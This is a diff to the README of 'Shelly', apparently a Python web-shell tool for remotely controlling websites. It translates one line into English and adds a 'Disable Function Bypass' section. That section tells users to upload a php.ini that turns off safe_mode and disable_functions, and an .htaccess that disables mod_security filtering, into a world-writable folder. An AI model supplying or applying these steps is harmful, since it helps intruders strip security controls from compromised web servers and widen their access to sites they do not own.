@@ -3,7 +3,7 @@
 
 ![Screenshoot](capture/capture-2.png)
 <br>
-Shelly adalah sebuah tool sederhana yang ditulis menggunakan Python, yang berfungsi untuk meremote sebuah website
+Shelly is a simple tool that is written using Python, which functions to remote a website
 <br>
 ### Instalation :
 
@@ -41,6 +41,23 @@ uid=501(pamz3d) gid=501(pamz3d) groups=501(pamz3d)
 </pre>
 ![Screenshoot](capture/capture.png)
 ![Screenshoot](capture/capture-3.png)
+
+### Disable Function Bypass :
+<ul>
+   <li>look for the folder whose permissions 777 (rwx rwx rwx)</li>
+   <li>Upload file php.ini </li>
+   <pre>
+   safe_mode = OFF
+   disable_functions = NONE
+   </pre>
+   <li>And upload file .htaccess</li>
+   <pre>
+   <IfModule mod_security.c>
+   SecFilterEngine Off
+   SecFilterScanPOST Off
+   </IfModule>
+   </pre>
+</ul>
 
 ### Artikel :
 <ul>
